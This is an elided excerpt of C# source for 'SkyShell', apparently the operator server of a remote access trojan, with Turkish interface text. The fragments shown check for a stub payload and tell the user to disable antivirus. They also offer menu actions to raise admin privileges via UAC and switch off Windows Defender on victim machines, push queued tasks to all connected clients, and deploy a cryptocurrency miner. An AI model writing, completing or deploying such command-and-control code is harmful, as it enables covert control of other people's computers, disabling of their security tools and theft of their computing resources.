...
namespace Server
{
    ...
    public partial class Form1 : Form
    {
        ...
        private List<SkyShellTask> getTasks = new List<SkyShellTask>();
        ...
        private void CheckFiles()
        {
            try
            {
                ...
                {
                    MessageBox.Show("Eksik: " + Path.GetFileName(Application.ExecutablePath) + ".config");
                    Environment.Exit(0);
                }

                if (!File.Exists(Path.Combine(Application.StartupPath, "Stub\\Stub.exe")))
                    MessageBox.Show("Stub bulunamadı! Dosyaları tekrar çıkartın ve anti-virüs programınızın kapalı olduğundan emin olun.");
            ...
            {
                MessageBox.Show(ex.Message, "SkyShell", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        ...
        private void GetAdminPrivilegesToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                DialogResult dialogResult = MessageBox.Show(this, "UAC yetki istemi gösterilsin mi?", "SkyShell | UAC", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
        ...
        private void DisableWindowsDefenderToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                DialogResult dialogResult = MessageBox.Show(this, "Sadece yönetici yetkisine sahip istemcilerde çalışacaktır!", "SkyShell | Defender'ı Kapat", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
                if (dialogResult == DialogResult.Yes)
                {
                    try
                    {
        ...
        {
            DialogResult dialogResult = MessageBox.Show(this, "Kaldırmak istediğinize emin misiniz?", "SkyShell | Kaldır", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
            if (dialogResult == DialogResult.Yes)
            {
                try
                {
        ...
        {
#if DEBUG
            MessageBox.Show("Hata ayıklama (debug) sürümü kullanarak derleme yapamazsınız, lütfen 'release' sürümünü kullanın.", "SkyShell | Oluşturucu", MessageBoxButtons.OK, MessageBoxIcon.Error);
            return;
#endif
        ...
        private async void TimerTask_Tick(object sender, EventArgs e)
        {
            try
            {
                ...
                if (getTasks.Count > 0 && clients.Length > 0)
                    foreach (SkyShellTask skyShellTask in getTasks.ToList())
                    {
                        if (GetListview(skyShellTask.id) == false)
                        {
                            getTasks.Remove(skyShellTask);
                        ...
                        foreach (Clients client in clients)
                        {
                            if (!skyShellTask.doneClient.Contains(client.ID))
                            {
                                Debug.WriteLine("task executed");
                                skyShellTask.doneClient.Add(client.ID);
                                SetExecution(skyShellTask.id);
                                ThreadPool.QueueUserWorkItem(client.Send, skyShellTask.msgPack);
                            }
                        }
            ...
            try
            {
                ...
                using (FormMiner form = new FormMiner())
                {
                    if (form.ShowDialog() == DialogResult.OK)
                    {
                        ...
                        getTasks.Add(new SkyShellTask(msgpack.Encode2Bytes(), lv.ToolTipText));
                    }
                }
            }
            catch (Exception ex)
